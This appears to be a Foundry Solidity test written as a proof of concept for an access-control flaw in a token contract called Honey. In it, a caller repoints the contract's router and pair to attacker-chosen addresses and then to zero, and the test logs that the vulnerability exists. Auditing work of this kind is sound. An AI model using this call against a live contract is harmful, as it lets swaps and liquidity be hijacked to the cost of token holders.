// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/Honey.sol";

contract HoneyPrivilegeTest is Test {
    Honey private honey;
    
    address private constant ROUTER_ADDRESS = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private constant WETH_ADDRESS = address(0xEEEE);
    address private constant FACTORY_MOCK = address(0xABCD);
    address private constant PAIR_MOCK = address(0x1234);
    
    address private maliciousRouter = address(0x666);
    address private maliciousPair = address(0x999);

    function setUp() public {
        // Mock external dependencies for constructor
        vm.mockCall(
            ROUTER_ADDRESS,
            abi.encodeWithSelector(IRouter.factory.selector),
            abi.encode(FACTORY_MOCK)
        );
        vm.mockCall(
            ROUTER_ADDRESS,
            abi.encodeWithSelector(IRouter.WETH.selector),
            abi.encode(WETH_ADDRESS)
        );
        vm.mockCall(
            FACTORY_MOCK,
            abi.encodeWithSelector(IFactory.createPair.selector),
            abi.encode(PAIR_MOCK)
        );
        
        honey = new Honey();
    }

    function test_updateRouterAndPairVulnerability() public {
        // Record initial states
        address initialRouter = address(honey.router());
        address initialPair = honey.pair();
        
        console2.log("--- BEFORE-Trigger updateRouterAndPair (malicious) ---");
        console2.log("Initial router:   ", initialRouter);
        console2.log("Initial pair:     ", initialPair);
        
        // First exploit: set to malicious addresses
        console2.log("--- Trigger updateRouterAndPair (malicious) ---");
        honey.updateRouterAndPair(maliciousRouter, maliciousPair);
        
        // Get states after first exploit
        address afterFirstUpdateRouter = address(honey.router());
        address afterFirstUpdatePair = honey.pair();
        
        console2.log("--- AFTER-Trigger updateRouterAndPair (malicious) ---");
        console2.log("Updated router:   ", afterFirstUpdateRouter);
        console2.log("Updated pair:     ", afterFirstUpdatePair);
        
        // Verify malicious addresses were set
        assertEq(afterFirstUpdateRouter, maliciousRouter, "Router not updated to malicious address");
        assertEq(afterFirstUpdatePair, maliciousPair, "Pair not updated to malicious address");
        
        console2.log("--- BEFORE-Trigger updateRouterAndPair (zero) ---");
        console2.log("Current router:   ", afterFirstUpdateRouter);
        console2.log("Current pair:     ", afterFirstUpdatePair);
        
        // Second exploit: set to zero addresses
        console2.log("--- Trigger updateRouterAndPair (zero) ---");
        honey.updateRouterAndPair(address(0), address(0));
        
        // Get states after second exploit
        address afterSecondUpdateRouter = address(honey.router());
        address afterSecondUpdatePair = honey.pair();
        
        console2.log("--- AFTER-Trigger updateRouterAndPair (zero) ---");
        console2.log("Updated router:   ", afterSecondUpdateRouter);
        console2.log("Updated pair:     ", afterSecondUpdatePair);
        
        // Verify zero addresses were set
        assertEq(afterSecondUpdateRouter, address(0), "Router not set to zero address");
        assertEq(afterSecondUpdatePair, address(0), "Pair not set to zero address");
        
        // Final vulnerability verification
        bool initialChangedToMalicious = 
            (initialRouter != maliciousRouter) && 
            (initialPair != maliciousPair) && 
            (afterFirstUpdateRouter == maliciousRouter) && 
            (afterFirstUpdatePair == maliciousPair);
            
        bool maliciousChangedToZero = 
            (afterSecondUpdateRouter == address(0)) && 
            (afterSecondUpdatePair == address(0));
        
        if (initialChangedToMalicious && maliciousChangedToZero) {
            console2.log("Vulnerability Exists: Unauthorized address can arbitrarily change router/pair");
        } else {
            console2.log("Vulnerability not Exist: Router/pair changes not executed as expected");
        }
    }
}